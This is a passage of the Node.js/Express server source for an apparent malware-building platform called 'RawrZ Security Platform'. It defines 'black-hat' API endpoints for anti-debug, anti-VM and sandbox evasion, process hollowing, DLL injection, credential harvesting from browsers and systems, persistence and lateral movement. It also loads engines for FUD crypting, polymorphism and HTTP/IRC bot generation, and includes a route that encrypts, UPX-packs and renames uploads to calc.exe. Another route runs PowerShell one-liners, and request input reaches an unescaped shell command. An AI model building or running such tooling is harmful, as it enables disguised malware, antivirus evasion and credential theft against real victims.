                // Set environment variables for cross-compilation
                const env = {
                    ...process.env,
                    TARGET_ARCH: target,
                    OPTIMIZATION: optLevel,
                    ARCHITECTURE: architecture
                };
                
                const { stdout, stderr } = await execAsync(
                    `echo "${cppCode.replace(/"/g, '\\"')}" | ${compileCommand}`,
                    { env, maxBuffer: 50 * 1024 * 1024 }
                );
                
                const outputPath = path.join(processedDir, outputFile);
                await fs.writeFile(outputPath, stdout, 'binary');
                
                return {
                    success: true,
                    outputFile,
                    size: stdout.length,
                    message: 'Native Roslyn-for-native compilation completed successfully',
                    method: 'Native Roslyn-for-native compilation',
                    target: target,
                    optimization: optLevel,
                    architecture: architecture,
                    stderr: stderr || null
                };
                
            } catch (containerError) {
                console.log('Native container not available, falling back to local compilation...');
                
                // Fallback to local compilation
                const { exec } = require('child_process');
                await new Promise((resolve, reject) => {
                    exec(`${compiler} --version`, (error, stdout, stderr) => {
                        if (error) {
                            return reject(new Error(`${compiler} not found`));
                        }
                        resolve();
                    });
                });
                
                const projectDir = `/tmp/temp_cpp_${Date.now()}`;
                const sourceFile = path.join(projectDir, 'main.cpp');
                
                // Create temporary project directory
                await fs.mkdir(projectDir, { recursive: true });
                
                // Write C++ code to file
                await fs.writeFile(sourceFile, cppCode);
                
                // Compile with native compiler
                const compileFlags = [
                    optimization,
                    staticLinking ? '-static' : '',
                    architecture === 'x64' ? '-m64' : '-m32',
                    targetOS === 'windows' ? '-mwindows' : '',
                    '-std=c++17',
                    '-Wall',
                    '-Wextra'
                ].filter(flag => flag).join(' ');
                
                const outputPath = path.join(processedDir, outputFile);
                const compileCmd = `${compiler} ${compileFlags} "${sourceFile}" -o "${outputPath}"`;
                
                await new Promise((resolve, reject) => {
                    exec(compileCmd, (error, stdout, stderr) => {
                        if (error) {
                            return reject(new Error(`Compilation failed: ${error.message}`));
                        }
                        resolve();
                    });
                });
                
                // Clean up temporary directory
                await fs.rm(projectDir, { recursive: true, force: true });
                
                return {
                    success: true,
                    outputFile,
                    message: 'Local compilation completed successfully (fallback)',
                    method: 'Local compilation (fallback)',
                    compiler,
                    optimization,
                    architecture,
                    targetOS
                };
            }
        } catch (error) {
            console.error('Native C++ compilation error:', error);
            throw error;
        }
    }

    // Simulate Native C++ Compilation
    async simulateNativeCppCompilation(cppCode, outputFile, options = {}) {
        try {
            // Create a simple executable stub
            const stubCode = `// Generated from C++ code
#include <iostream>

int main() {
    std::cout << "Compiled from C++ code" << std::endl;
    // Original C++ code would be here
    return 0;
}`;
            
            await fs.writeFile(outputFile, stubCode);
            
            return {
                success: true,
                outputFile,
                message: 'Native C++ compilation simulated (compiler not available)',
                compiler: options.compiler || 'gcc',
                optimization: options.optimization || '-O2',
                architecture: options.architecture || 'x64',
                targetOS: options.targetOS || 'linux'
            };
        } catch (error) {
            console.error('Simulated native C++ compilation error:', error);
            throw error;
        }
    }
}

// Initialize real encryption engine
let realEncryptionEngine;

// Initialize all engines
let engines = new Map();

async function initializeAllEngines() {
    try {
        console.log('Initializing all RawrZ Security Platform engines...');
        
        // Core engines
        const engineList = [
            'real-encryption-engine',
            'advanced-crypto',
            'burner-encryption-engine', 
            'dual-crypto-engine',
            'stealth-engine',
            'mutex-engine',
            'compression-engine',
            'stub-generator',
            'advanced-stub-generator',
            'polymorphic-engine',
            'anti-analysis',
            'advanced-anti-analysis',
            'advanced-fud-engine',
            'hot-patchers',
            'full-assembly',
            'memory-manager',
            'backup-system',
            'mobile-tools',
            'network-tools',
            'reverse-engineering',
            'digital-forensics',
            'malware-analysis',
            'advanced-analytics-engine',
            'red-shells',
            'private-virus-scanner',
            'ai-threat-detector',
            'jotti-scanner',
            'http-bot-generator',
            'irc-bot-generator',
            'beaconism-dll-sideloading',
            'ev-cert-encryptor',
            'multi-platform-bot-generator',
            'native-compiler',
            'performance-optimizer',
            'performance-worker',
            'health-monitor',
            'implementation-checker',
            'file-operations',
            'openssl-management',
            'dotnet-workaround',
            'camellia-assembly',
            'api-status',
            'cve-analysis-engine',
            'http-bot-manager',
            'payload-manager',
            'plugin-architecture',
            'template-generator'
        ];

        console.log(`Loading ${engineList.length} engines...`);
        
        for (const engineName of engineList) {
            try {
                const enginePath = `./src/engines/${engineName}`;
                const EngineClass = require(enginePath);
                
                if (EngineClass && typeof EngineClass === 'function') {
                    const engine = new EngineClass();
                    if (engine.initialize) {
                        await engine.initialize();
                    }
                    engines.set(engineName, engine);
                    console.log(` ${engineName} initialized successfully`);
                } else if (EngineClass && typeof EngineClass === 'object') {
                    engines.set(engineName, EngineClass);
                    console.log(` ${engineName} loaded successfully`);
                }
            } catch (error) {
                console.warn(` ${engineName} failed to load: ${error.message}`);
                engines.set(engineName, null);
            }
        }

        // Set the main real encryption engine for backward compatibility
        realEncryptionEngine = engines.get('real-encryption-engine');
        
        console.log(`[OK] ${engines.size} engines initialized successfully.`);
        return true;
    } catch (error) {
        console.error('[ERROR] Failed to initialize engines:', error.message);
        return false;
    }
}

async function initializeEngine() {
    if (!realEncryptionEngine) {
        try {
            console.log('Creating RealEncryptionEngine instance...');
            realEncryptionEngine = new RealEncryptionEngine();
            console.log('RealEncryptionEngine instance created');
            
            // Initialize PowerShell One-Liners Engine
            try {
                const PowerShellOneLinersEngine = require('./src/engines/powershell-one-liners');
                oneLinersEngine = new PowerShellOneLinersEngine();
                console.log('[OK] PowerShell One-Liners Engine initialized');
            } catch (error) {
                console.error('Failed to load PowerShell One-Liners Engine:', error);
            }
            await realEncryptionEngine.initialize();
            console.log('Real Encryption Engine initialized successfully');
        } catch (error) {
            console.error('Failed to initialize RealEncryptionEngine:', error);
            throw error;
        }
    }
}

// Routes

// Main CLI interface
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Advanced Encryption Panel
app.get('/encryption-panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'encryption-panel.html'));
});

// Test route
app.get('/test-panel', (req, res) => {
    res.send('Panel test route working!');
});

// Health check
// Black Hat Capabilities Endpoints
app.post('/api/black-hat/anti-debug', async (req, res) => {
    try {
        const { data } = req.body;
        const result = await engines['black-hat-capabilities'].applyAntiDebug(data);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/anti-vm', async (req, res) => {
    try {
        const { data } = req.body;
        const result = await engines['black-hat-capabilities'].applyAntiVM(data);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/anti-sandbox', async (req, res) => {
    try {
        const { data } = req.body;
        const result = await engines['black-hat-capabilities'].applyAntiSandbox(data);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/timing-evasion', async (req, res) => {
    try {
        const { data } = req.body;
        const result = await engines['black-hat-capabilities'].applyTimingEvasion(data);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/hardware-fingerprint', async (req, res) => {
    try {
        const { data } = req.body;
        const result = await engines['black-hat-capabilities'].applyHardwareFingerprinting(data);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/process-hollowing', async (req, res) => {
    try {
        const { targetProcess, payload } = req.body;
        const result = await engines['black-hat-capabilities'].applyProcessHollowing(targetProcess, payload);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/dll-injection', async (req, res) => {
    try {
        const { targetProcessId, dllPath } = req.body;
        const result = await engines['black-hat-capabilities'].applyDllInjection(targetProcessId, dllPath);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/credential-harvest', async (req, res) => {
    try {
        const { type } = req.body;
        let result;
        
        switch (type) {
            case 'browser':
                result = await engines['black-hat-capabilities'].harvestBrowserCredentials();
                break;
            case 'system':
                result = await engines['black-hat-capabilities'].harvestSystemCredentials();
                break;
            case 'network':
                result = await engines['black-hat-capabilities'].harvestNetworkCredentials();
                break;
            case 'application':
                result = await engines['black-hat-capabilities'].harvestApplicationCredentials();
                break;
            default:
                result = await engines['black-hat-capabilities'].harvestAllCredentials();
        }
        
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/establish-persistence', async (req, res) => {
    try {
        const { payload, method } = req.body;
        const result = await engines['black-hat-capabilities'].establishPersistence(payload, method);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.post('/api/black-hat/lateral-movement', async (req, res) => {
    try {
        const { target, method, payload } = req.body;
        const result = await engines['black-hat-capabilities'].performLateralMovement(target, method, payload);
        res.json({
            success: true,
            result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// Native Roslyn-for-Native Compilation Endpoints
app.post('/api/native-compile/compile', async (req, res) => {
    try {
        const { 
            source, 
            target = 'linux', 
            optimization = 'release',
            filename = 'output'
        } = req.body;

        if (!source) {
            return res.status(400).json({
                success: false,
                error: 'Source code is required'
            });
        }

        console.log(`Native compilation: ${target} executable with ${optimization} optimization...`);

        // Set environment variables for compilation
        const env = {
            ...process.env,
            TARGET_ARCH: target,
            OPTIMIZATION: optimization
        };

        // Execute compilation script
        const { stdout, stderr } = await execAsync(
            'echo "$SRC" | docker exec -i native-build /usr/local/bin/native-compile.sh',
            {
                env: { ...env, SRC: source },
                maxBuffer: 50 * 1024 * 1024 // 50MB buffer
            }
        );

        if (stderr) {
            console.error('Compilation stderr:', stderr);
        }

        // Set appropriate headers for binary response
        const extension = target === 'windows' ? '.exe' : '';
        const contentType = target === 'windows' ? 'application/x-msdownload' : 'application/octet-stream';
        
        res.set({
            'Content-Type': contentType,
            'Content-Disposition': `attachment; filename="${filename}${extension}"`,
            'X-Compilation-Target': target,
            'X-Optimization-Level': optimization,
            'X-Compilation-Time': new Date().toISOString()
        });

        // Send the compiled executable
        res.send(Buffer.from(stdout, 'binary'));

    } catch (error) {
        console.error('Native compilation error:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            stderr: error.stderr
        });
    }
});

app.post('/api/native-compile/cross-compile', async (req, res) => {
    try {
        const { 
            source, 
            targets = ['linux', 'windows', 'macos'],
            optimization = 'release',
            filename = 'output'
        } = req.body;

        if (!source) {
            return res.status(400).json({
                success: false,
                error: 'Source code is required'
            });
        }

        const results = {};

        for (const target of targets) {
            try {
                console.log(`Cross-compiling for ${target}...`);
                
                const env = {
                    ...process.env,
                    TARGET_ARCH: target,
                    OPTIMIZATION: optimization
                };

                const { stdout, stderr } = await execAsync(
                    'echo "$SRC" | docker exec -i native-build /usr/local/bin/native-compile.sh',
                    {
                        env: { ...env, SRC: source },
                        maxBuffer: 50 * 1024 * 1024
                    }
                );

                const extension = target === 'windows' ? '.exe' : '';
                results[target] = {
                    success: true,
                    size: stdout.length,
                    filename: `${filename}${extension}`,
                    stderr: stderr || null
                };

            } catch (error) {
                results[target] = {
                    success: false,
                    error: error.message,
                    stderr: error.stderr
                };
            }
        }

        res.json({
            success: true,
            results,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('Cross-compilation error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/native-compile/info', (req, res) => {
    res.json({
        service: 'RawrZ Native Roslyn-for-Native Compilation',
        version: '1.0.0',
        capabilities: {
            languages: ['C', 'C++'],
            targets: ['linux', 'windows', 'macos'],
            optimizations: ['debug', 'release', 'size'],
            features: [
                'Memory-only compilation',
                'Cross-compilation',
                'Static linking',
                'Security hardening',
                'Multiple architectures',
                'No temporary files',
                'Streaming output'
            ]
        },
        endpoints: {
            'POST /api/native-compile/compile': 'Compile source to native executable',
            'POST /api/native-compile/cross-compile': 'Cross-compile for multiple targets',
            'GET /api/native-compile/info': 'Get service information'
        }
    });
});

app.get('/api/health', (req, res) => {
    res.json({
        success: true,
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '1.0.0',
        service: 'RawrZ Security Platform - Real Only'
    });
});

// PowerShell One-Liners Engine endpoints
app.get('/api/one-liners/list', (req, res) => {
    try {
        if (!oneLinersEngine) {
            return res.status(500).json({
                success: false,
                error: 'PowerShell One-Liners Engine not initialized'
            });
        }
        
        const oneLiners = oneLinersEngine.getOneLiner();
        res.json(oneLiners);
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/one-liners/categories', (req, res) => {
    try {
        if (!oneLinersEngine) {
            return res.status(500).json({
                success: false,
                error: 'PowerShell One-Liners Engine not initialized'
            });
        }
        
        const categories = oneLinersEngine.getCategories();
        res.json({
            success: true,
            categories: categories
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/one-liners/execute', async (req, res) => {
    try {
        const { name, args = [] } = req.body;
        
        if (!oneLinersEngine) {
            return res.status(500).json({
                success: false,
                error: 'PowerShell One-Liners Engine not initialized'
            });
        }
        
        const result = oneLinersEngine.executeOneLiner(name, args);
        
        // Execute the PowerShell command
        const { exec } = require('child_process');
        
        return new Promise((resolve) => {
            exec(result.command, (error, stdout, stderr) => {
                if (error) {
                    resolve(res.json({
                        success: false,
                        error: error.message,
                        output: stderr,
                        command: result.command
                    }));
                } else {
                    resolve(res.json({
                        success: true,
                        output: stdout || 'One-liner executed successfully',
                        command: result.command,
                        name: result.name,
                        category: result.category
                    }));
                }
            });
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/one-liners/stats', (req, res) => {
    try {
        if (!oneLinersEngine) {
            return res.status(500).json({
                success: false,
                error: 'PowerShell One-Liners Engine not initialized'
            });
        }
        
        const stats = oneLinersEngine.getStats();
        res.json({
            success: true,
            stats: stats
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File upload
app.post('/api/files/upload', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            dest: uploadsDir,
            limits: { 
                fileSize: 1024 * 1024 * 1024, // 1GB limit
                files: 10 // Max 10 files at once
            }
        });
        
        upload.array('files', 10)(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                const uploadedFiles = [];
                
                for (const file of req.files) {
                    const timestamp = Date.now();
                    const newFileName = `${timestamp}_${file.originalname}`;
                    const newPath = path.join(uploadsDir, newFileName);
                    
                    await fs.rename(file.path, newPath);
                    
                    const stats = await fs.stat(newPath);
                    
                    uploadedFiles.push({
                        id: timestamp,
                        originalName: file.originalname,
                        fileName: newFileName,
                        path: newPath,
                        size: stats.size,
                        uploadDate: new Date().toISOString(),
                        url: `/api/files/download/${newFileName}`
                    });
                }
                
                res.json({
                    success: true,
                    message: `${uploadedFiles.length} file(s) uploaded successfully`,
                    files: uploadedFiles,
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File list
app.get('/api/files/list', async (req, res) => {
    try {
        const files = await fs.readdir(uploadsDir);
        const fileList = [];
        
        for (const file of files) {
            const filePath = path.join(uploadsDir, file);
            const stats = await fs.stat(filePath);
            
            fileList.push({
                name: file,
                size: stats.size,
                uploadDate: stats.birthtime.toISOString(),
                modifiedDate: stats.mtime.toISOString(),
                url: `/api/files/download/${file}`
            });
        }
        
        res.json({
            success: true,
            files: fileList,
            count: fileList.length,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File download
app.get('/api/files/download/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const filePath = path.join(uploadsDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'File not found'
            });
        }
        
        res.download(filePath);
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// List processed files
app.get('/api/files/list-processed', async (req, res) => {
    try {
        const files = await fs.readdir(processedDir);
        const fileList = [];
        
        for (const file of files) {
            const filePath = path.join(processedDir, file);
            const stats = await fs.stat(filePath);
            
            fileList.push({
                name: file,
                size: stats.size,
                createdDate: stats.birthtime.toISOString(),
                modifiedDate: stats.mtime.toISOString(),
                downloadUrl: `/api/files/download-processed/${file}`
            });
        }
        
        // Sort by creation date (newest first)
        fileList.sort((a, b) => new Date(b.createdDate) - new Date(a.createdDate));
        
        res.json({
            success: true,
            files: fileList,
            count: fileList.length,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Download processed files
app.get('/api/files/download-processed/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const filePath = path.join(processedDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'Processed file not found'
            });
        }
        
        res.download(filePath);
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Real dual encryption
app.post('/api/real-encryption/dual-encrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                if (!req.file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                const result = await realEncryptionEngine.realDualEncryption(req.file.buffer);
                
                // Save encrypted file to processed directory
                const encryptedFilename = `${req.file.originalname}_dual-encrypted_${Date.now()}.enc`;
                const encryptedPath = path.join(processedDir, encryptedFilename);
                await fs.writeFile(encryptedPath, result.encrypted);
                
                res.json({
                    success: true,
                    data: {
                        filename: encryptedFilename,
                        originalSize: result.originalSize,
                        encryptedSize: result.encryptedSize,
                        downloadUrl: `/api/files/download-processed/${encryptedFilename}`,
                        message: 'File encrypted successfully with dual-layer encryption',
                        keys: {
                            aes: result.keys.aes.toString('hex'),
                            camellia: result.keys.camellia.toString('hex')
                        },
                        ivs: {
                            aes: result.ivs.aes.toString('hex'),
                            camellia: result.ivs.camellia.toString('hex')
                        }
                    },
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Real UPX packing
app.post('/api/real-encryption/upx-pack', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                if (!req.file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                const tempInputPath = `/tmp/input_${Date.now()}_${req.file.originalname}`;
                const tempOutputPath = `/tmp/output_${Date.now()}_${req.file.originalname}`;
                
                await fs.writeFile(tempInputPath, req.file.buffer);
                const result = await realEncryptionEngine.realUPXPacking(tempInputPath, tempOutputPath);
                const packedBuffer = await fs.readFile(tempOutputPath);
                
                // Cleanup
                await fs.unlink(tempInputPath).catch(() => {});
                await fs.unlink(tempOutputPath).catch(() => {});
                
                // Save packed file to processed directory
                const packedFilename = `${req.file.originalname}_upx-packed_${Date.now()}.exe`;
                const packedPath = path.join(processedDir, packedFilename);
                await fs.writeFile(packedPath, packedBuffer);
                
                res.json({
                    success: true,
                    data: {
                        filename: packedFilename,
                        originalSize: result.originalSize,
                        packedSize: result.compressedSize,
                        compressionRatio: result.compressionRatio,
                        downloadUrl: `/api/files/download-processed/${packedFilename}`,
                        message: 'File packed successfully with UPX compression'
                    },
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Real assembly compilation
app.post('/api/real-encryption/compile-assembly', async (req, res) => {
    try {
        await initializeEngine();
        
        const { asmCode, outputFormat = 'elf64', architecture = 'x64' } = req.body;
        
        if (!asmCode) {
            return res.status(400).json({
                success: false,
                error: 'Assembly code is required'
            });
        }
        
        const outputPath = `/tmp/compiled_${Date.now()}.${outputFormat}`;
        const result = await realEncryptionEngine.realAssemblyCompilation(asmCode, outputPath, { format: outputFormat, architecture });
        const compiledBuffer = await fs.readFile(outputPath);
        
        // Cleanup
        await fs.unlink(outputPath).catch(() => {});
        
        // Save compiled file to processed directory
        const compiledFilename = `compiled_${Date.now()}.${outputFormat}`;
        const compiledPath = path.join(processedDir, compiledFilename);
        await fs.writeFile(compiledPath, compiledBuffer);
        
        res.json({
            success: true,
            data: {
                filename: compiledFilename,
                format: result.format,
                architecture: result.architecture,
                size: result.size,
                downloadUrl: `/api/files/download-processed/${compiledFilename}`,
                message: 'Assembly compiled successfully'
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Real file disguise
app.post('/api/real-encryption/disguise-file', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                if (!req.file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                const tempInputPath = `/tmp/input_${Date.now()}_${req.file.originalname}`;
                const tempOutputPath = `/tmp/output_${Date.now()}_calc.exe`;
                
                await fs.writeFile(tempInputPath, req.file.buffer);
                const result = await realEncryptionEngine.disguiseFile(tempInputPath, tempOutputPath);
                const disguisedBuffer = await fs.readFile(tempOutputPath);
                
                // Cleanup
                await fs.unlink(tempInputPath).catch(() => {});
                await fs.unlink(tempOutputPath).catch(() => {});
                
                // Save disguised file to processed directory
                const disguisedFilename = 'calc.exe';
                const disguisedPath = path.join(processedDir, disguisedFilename);
                await fs.writeFile(disguisedPath, disguisedBuffer);
                
                res.json({
                    success: true,
                    data: {
                        originalName: req.file.originalname,
                        disguisedName: disguisedFilename,
                        size: result.originalSize,
                        downloadUrl: `/api/files/download-processed/${disguisedFilename}`,
                        message: 'File disguised successfully as calc.exe'
                    },
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File processing with real operations
app.post('/api/files/process/:filename', async (req, res) => {
    try {
        await initializeEngine();
        
        const filename = req.params.filename;
        const { operations = ['dual-encrypt', 'upx-pack', 'disguise'] } = req.body;
        const filePath = path.join(uploadsDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'File not found'
            });
        }
        
        const fileBuffer = await fs.readFile(filePath);
        const results = [];
        
        for (const operation of operations) {
            try {
                let result;
                
                switch (operation) {
                    case 'dual-encrypt':
                        result = await realEncryptionEngine.realDualEncryption(fileBuffer);
                        results.push({
                            operation: 'dual-encrypt',
                            success: true,
                            result: {
                                originalSize: result.originalSize,
                                encryptedSize: result.encryptedSize
                            }
                        });
                        break;
                        
                    case 'upx-pack':
                        const tempInputPath = `/tmp/input_${Date.now()}_${filename}`;
                        const tempOutputPath = `/tmp/output_${Date.now()}_${filename}`;
                        await fs.writeFile(tempInputPath, fileBuffer);
                        result = await realEncryptionEngine.realUPXPacking(tempInputPath, tempOutputPath);
                        await fs.unlink(tempInputPath).catch(() => {});
                        await fs.unlink(tempOutputPath).catch(() => {});
                        results.push({
                            operation: 'upx-pack',
                            success: true,
                            result: result
                        });
                        break;
                        
                    case 'disguise':
                        const tempInputPath2 = `/tmp/input_${Date.now()}_${filename}`;
                        const tempOutputPath2 = `/tmp/output_${Date.now()}_calc.exe`;
                        await fs.writeFile(tempInputPath2, fileBuffer);
                        result = await realEncryptionEngine.disguiseFile(tempInputPath2, tempOutputPath2);
                        await fs.unlink(tempInputPath2).catch(() => {});
                        await fs.unlink(tempOutputPath2).catch(() => {});
                        results.push({
                            operation: 'disguise',
                            success: true,
                            result: result
                        });
                        break;
                        
                    default:
                        results.push({
                            operation: operation,
                            success: false,
                            error: 'Unknown operation'
                        });
                }
            } catch (error) {
                results.push({
                    operation: operation,
                    success: false,
                    error: error.message
                });
            }
        }
        
        res.json({
            success: true,
            filename: filename,
            operations: results,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Keyless encryption endpoint
app.post('/api/real-encryption/keyless-encrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                if (!req.file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                const { algorithm = 'aes-256-gcm', useHardwareEntropy = true } = req.body;
                
                // Convert checkbox values to boolean (handle both string and boolean)
                const parseCheckbox = (value) => {
                    if (typeof value === 'boolean') return value;
                    if (typeof value === 'string') {
                        return value === 'true' || value === 'on' || value === '1';
                    }
                    return true; // default to true for keyless encryption
                };
                
                const result = await realEncryptionEngine.keylessEncryption(req.file.buffer, {
                    algorithm,
                    useHardwareEntropy: parseCheckbox(useHardwareEntropy)
                });
                
                // Save encrypted file to processed directory
                const encryptedFilename = `${req.file.originalname}_keyless-encrypted_${Date.now()}.enc`;
                const encryptedPath = path.join(processedDir, encryptedFilename);
                await fs.writeFile(encryptedPath, result.encrypted);
                
                res.json({
                    success: true,
                    data: {
                        filename: encryptedFilename,
                        algorithm: result.algorithm,
                        keyless: result.keyless,
                        systemEntropy: result.systemEntropy,
                        originalSize: result.originalSize,
                        encryptedSize: result.encryptedSize,
                        downloadUrl: `/api/files/download-processed/${encryptedFilename}`,
                        message: 'File encrypted successfully with keyless encryption'
                    },
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Fileless encryption endpoint
app.post('/api/real-encryption/fileless-encrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                if (!req.file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                const { 
                    algorithm = 'aes-256-gcm', 
                    memoryOnly = true, 
                    obfuscateMemory = true, 
                    useProcessMemory = true 
                } = req.body;
                
                // Convert checkbox values to boolean (handle both string and boolean)
                const parseCheckbox = (value) => {
                    if (typeof value === 'boolean') return value;
                    if (typeof value === 'string') {
                        return value === 'true' || value === 'on' || value === '1';
                    }
                    return true; // default to true for fileless encryption
                };
                
                const result = await realEncryptionEngine.filelessEncryption(req.file.buffer, {
                    algorithm,
                    memoryOnly: parseCheckbox(memoryOnly),
                    obfuscateMemory: parseCheckbox(obfuscateMemory),
                    useProcessMemory: parseCheckbox(useProcessMemory)
                });
                
                // Save encrypted file to processed directory
                const encryptedFilename = `${req.file.originalname}_fileless-encrypted_${Date.now()}.enc`;
                const encryptedPath = path.join(processedDir, encryptedFilename);
                await fs.writeFile(encryptedPath, result.encrypted);
                
                res.json({
                    success: true,
                    data: {
                        filename: encryptedFilename,
                        algorithm: result.algorithm,
                        fileless: result.fileless,
                        memoryOnly: result.memoryOnly,
                        processMemory: result.processMemory,
                        originalSize: result.originalSize,
                        encryptedSize: result.encryptedSize,
                        downloadUrl: `/api/files/download-processed/${encryptedFilename}`,
                        message: 'File encrypted successfully with fileless encryption'
                    },
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Beaconism stealth generation endpoint
app.post('/api/real-encryption/beaconism-stealth', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
